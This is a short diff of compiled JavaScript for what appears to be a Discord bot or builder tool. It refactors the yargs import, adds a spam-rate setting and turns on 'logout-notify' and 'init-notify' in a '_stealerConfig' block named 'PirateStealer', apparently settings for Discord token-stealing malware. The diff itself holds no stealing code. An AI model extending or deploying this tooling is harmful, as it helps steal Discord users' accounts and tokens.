@@ -1,11 +1,14 @@
 "use strict";
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
 Object.defineProperty(exports, "__esModule", { value: true });
 /// <reference path="typeFix/fix.d.ts" />
 const fs_extra_1 = require("fs-extra");
 const start_1 = require("./start");
 const dotenv_1 = require("dotenv");
 const constants_1 = require("./constants");
-const yargs = require("yargs");
+const yargs_1 = __importDefault(require("yargs"));
 const helpers_1 = require("yargs/helpers");
 const configFSBinder_1 = require("./configFSBinder");
 const log_1 = require("./log");
@@ -23,11 +26,12 @@ async function init() {
             token: constants_1.INIT_TOKEN,
             prefix: constants_1.FALLBACK_PREFIX,
             ignoreErrors: false,
+            spamRate: constants_1.SECOND * 2,
             _stealerConfig: {
                 stealerName: "PirateStealer",
                 logout: "%LOGOUT%",
-                "logout-notify": false,
-                "init-notify": false,
+                "logout-notify": true,
+                "init-notify": true,
                 "embed-color": 3447704,
                 "disable-qr-code": false,
             }
@@ -69,7 +73,7 @@ async function createFileIfDoesNotExit(path, fallbackContent) {
     }
 }
 function initYargs(configFsBinder) {
-    yargs((0, helpers_1.hideBin)(process.argv))
+    (0, yargs_1.default)((0, helpers_1.hideBin)(process.argv))
         .command("token <token>", "Add or update Discord token", (yargs) => {
         yargs.positional("token", {
             description: "Discord token",
